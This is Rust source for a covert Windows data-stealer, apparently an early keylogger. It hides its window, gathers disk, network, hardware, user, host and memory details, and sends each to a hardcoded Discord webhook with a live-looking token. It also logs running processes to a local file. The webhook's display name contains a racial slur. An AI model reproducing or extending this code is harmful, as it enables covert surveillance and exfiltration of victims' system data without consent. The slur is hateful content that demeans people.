#![windows_subsystem = "windows"]


mod win_key_codes;

#[cfg(windows)]
extern crate winapi;


const WEB_HOOK: &str = "https://discord.com/api/webhooks/1089619554558292048/qhLSa0sBrCn4-HBnD0_IQiuVZ5Rdo-cZaS4cMDv8sQRCkFBJy6gFBPbv_GLxZdlZf2q1";


use std::fmt::format;
use std::fs::*;
use std::io::*;
use futures::prelude::*;
use tokio::runtime::Runtime;

use serenity::{http::Http, model::webhook::Webhook};
use chrono::{DateTime, Timelike, Utc};
use sysinfo::{DiskExt, NetworkExt, ProcessExt, System, SystemExt, UserExt};



async fn sendToMyDC(msg:String)  -> Result<()>{
    let time: DateTime<Utc> = Utc::now();
    let date = format!("{:02}h:{:02}m", time.hour()+2, time.minute());
    println!("sending");
    let http = Http::new("qhLSa0sBrCn4-HBnD0_IQiuVZ5Rdo-cZaS4cMDv8sQRCkFBJy6gFBPbv_GLxZdlZf2q1");
    let webhook = Webhook::from_url(&http, WEB_HOOK).await.expect("Replace the webhook with your own");

    webhook
        .execute(&http, false, |w|{ w.content(msg).username(format!("nigger slayer {}", date)) } )
        .await
        .expect("could not work :(");


    Ok(())
}


#[cfg(windows)]
fn log_header(file: &mut File) {

    let time: DateTime<Utc> = Utc::now();

    let mut sys = System::new_all();
    sys.refresh_all();

    //start tokio
    let rt = Runtime::new().unwrap();


    let write: String = format!("date: {} current time = {:02}h:{:02}m:{:02}s\nOS info:\n", time.date_naive(), time.hour()+2, time.minute(), time.second());



    // We display all disks' information:
    let mut diskPrint = format!("\n=> disks:\n");
    for disk in sys.disks() {
        diskPrint += &*format!("name: {:?}, type: {:?},is removable: {:?}, filesystem: {:?} space: {:?}GB / {:?}GB, mountpoint: {:?}\n", disk.name(), disk.type_(), disk.is_removable(), String::from_utf8_lossy(disk.file_system()), disk.available_space() / (1024 * 1024 * 1024), disk.total_space() / (1024 * 1024 * 1024), disk.mount_point());
    }
    println!("{}",diskPrint);

    rt.block_on(sendToMyDC(diskPrint)).expect("fuck tokio ");

    // Network interfaces name, data received and data transmitted:
    let mut netW = format!("\n=> networks:\n");
    for (interface_name, data) in sys.networks() {
        netW += &*format!("{}: (r){}/(w){} B\n", interface_name, data.received(), data.transmitted());
    }
    println!("{}",netW);
    rt.block_on(sendToMyDC(netW)).expect("fuck tokio ");

    // Components temperature:
    let mut temp = format!("\n=> components:\n");
    for component in sys.components() {
        temp += &*format!("{:?}\n", component);
    }
    println!("{}",temp);
    rt.block_on(sendToMyDC(temp)).expect("fuck tokio ");

    let mut systemInfo:String = format!("\n=> system:\n");
    // Display system information:
    systemInfo += &*format!("System name:             {:?}\n", sys.name());
    systemInfo += &*format!("System kernel version:   {:?}\n", sys.kernel_version());
    systemInfo += &*format!("System OS version:       {:?}\n", sys.os_version());
    systemInfo += &*format!("System host name:        {:?}\n", sys.host_name());
    systemInfo += &*format!("\nNB CPUs: {}\n", sys.cpus().len());
    for user in sys.users() {
        systemInfo += &*format!("{} is in {} groups \n", user.name(), user.groups().len());
    }
    println!("{}", systemInfo);
    rt.block_on(sendToMyDC(systemInfo)).expect("fuck tokio ");

    // RAM and swap information:
    let mut ramInfo:String = format!("\n=> Ram:\n");
    ramInfo += &*format!("total memory: {} MB\n", sys.total_memory()  / (1024 * 1024 ));
    ramInfo += &*format!("used memory : {} MB\n", sys.used_memory()/ (1024 * 1024 ));
    ramInfo += &*format!("total swap  : {} MB\n", sys.total_swap()/ (1024 * 1024 ));
    ramInfo += &*format!("used swap   : {} MB\n", sys.used_swap()/ (1024 * 1024 ));

    println!("{}", ramInfo);
    rt.block_on(sendToMyDC(ramInfo)).expect("fuck tokio ");

    // Display processes ID, name na disk usage:
    let mut proc:String = format!("\n\n=> Processes:\n");

    for (pid, process) in sys.processes() {
        proc += &*format!("[{}] {} {:?}\n", pid, process.name(), process.disk_usage());
    }

    file.write(write.as_bytes()).expect("help i am broken");
    file.write(proc.as_bytes()).expect("help i am broken at proc");
    file.write(b"--- Start of Logging ---").expect("TODO: panic message");
}


#[cfg(not(windows))]
fn log_write(file: &mut File, s: String){

}






#[cfg(windows)]
fn run(file: &mut File) {
    use winapi::um::winuser::*;
    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::psapi::GetProcessImageFileNameW;
    use winapi::um::winnls::GetUserDefaultLocaleName;
    use winapi::shared::minwindef::DWORD;
    use winapi::ctypes::c_int;
    use std::{thread, time::Duration};


    log_header(file);


}


fn main() {

    let now: DateTime<Utc> = Utc::now();
    let filename = format!("log-{}-{:02}+{:02}+{:02}.log", now.date_naive(), now.hour(), now.minute(), now.second());

    let mut output = {
        match OpenOptions::new().write(true).create(true).open(&filename) {
            Ok(f) => { f }

            Err(e) => {
                panic!("Couldn't create Output file: {}", e);
            }
        }
    };

    run(&mut output);
}




